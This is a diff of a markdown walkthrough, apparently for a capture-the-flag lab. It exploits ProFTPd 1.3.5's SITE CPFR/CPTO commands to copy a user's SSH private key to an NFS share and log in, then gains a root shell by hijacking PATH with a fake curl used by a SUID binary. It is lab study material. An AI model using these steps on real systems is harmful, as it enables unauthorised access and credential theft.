@@ -14,22 +14,21 @@ Tasks:
     1. Use `nc ip 21` to connect to ftp. ProFTPd version used is 1.3.5. Use searchsploit find exploits  for the ProFTPd server used. &#x20;
     2. connect to ftp server and type `SITE CPFR /home/kenobi/.ssh/id_rsa`  and `SITE CPTO /var/tmp/id_rsa` to copy ssh private key to nfs share.
     3. Mount NFS share to your machine , copy ssh private key from /var/tmp to current working directory and ssh into kenobi using&#x20;
-       1. _`mkdir /mnt/kenobiNFS`_\
-          ``_`mount machine_ip:/var /mnt/kenobiNFS`_\
-          ``_`ls -la /mnt/kenobiNFS`_
-       2. _`cp /mnt/kenobiNFS/tmp/id_rsa . `_
-       3. _`ssh -i id_rsa kenobi@ip`_
-    4. _`cat `_`/home/kenobi/user.txt` and submit user flag&#x20;
+       1. `mkdir /mnt/kenobiNFS`
+          `mount machine_ip:/var /mnt/kenobiNFS`
+          `ls -la /mnt/kenobiNFS`
+       2. `cp /mnt/kenobiNFS/tmp/id_rsa . `
+       3. `ssh -i id_rsa kenobi@ip`
+    4. `cat /home/kenobi/user.txt` and submit user flag&#x20;
 
-    __
 4. Privilege Escalation with Path Variable Manipulation:
-   1. Find binaries with suid bit set using _`find / -perm -u=s -type f 2>/dev/null` _
-   2. _/usr/bin/menu seems looks out of ordinary_
-   3. _Using strings on menu , we find that curl is called without full path ,So we can copy /bin/sh as curl to tmp path and export tmp path using `echo /bin/sh > /tmp/curl`  , `chmod 777 /tmp/curl` , `export PATH=/tmp:$PATH` _
-   4. _Now run /usr/bin/menu and select option 1 , you will get root shell._
-   5. _`cat /root/root.txt` and submit root flag._
+   1. Find binaries with suid bit set using `find / -perm -u=s -type f 2>/dev/null` 
+   2. /usr/bin/menu seems looks out of ordinary
+   3. Using strings on menu , we find that curl is called without full path ,So we can copy /bin/sh as curl to tmp path and export tmp path using `echo /bin/sh > /tmp/curl`  , `chmod 777 /tmp/curl` , `export PATH=/tmp:$PATH` 
+   4. Now run /usr/bin/menu and select option 1 , you will get root shell._
+   5. `cat /root/root.txt` and submit root flag.
 
-__
+
 
 References:
 
